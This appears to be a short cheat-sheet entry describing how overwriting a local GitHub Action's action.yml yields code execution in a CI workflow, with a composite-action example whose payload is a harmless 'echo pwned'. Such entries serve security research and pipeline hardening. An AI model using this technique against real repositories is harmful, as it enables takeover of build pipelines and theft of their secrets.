---
title: Local GHA
tags:
- github-actions
- eval-sh
- config-file
references:
- https://docs.github.com/en/actions/sharing-automations/creating-actions
files:
- action.yml
- action.yaml
- Dockerfile
---

If GitHub Action uses a local action such as `uses: ./`, we can overwrite the configuration file and gain RCE with an `action.yml` file such as this:

```yaml
runs:
  using: 'composite'
  steps:
    - shell: bash
      run: echo "pwned"
```
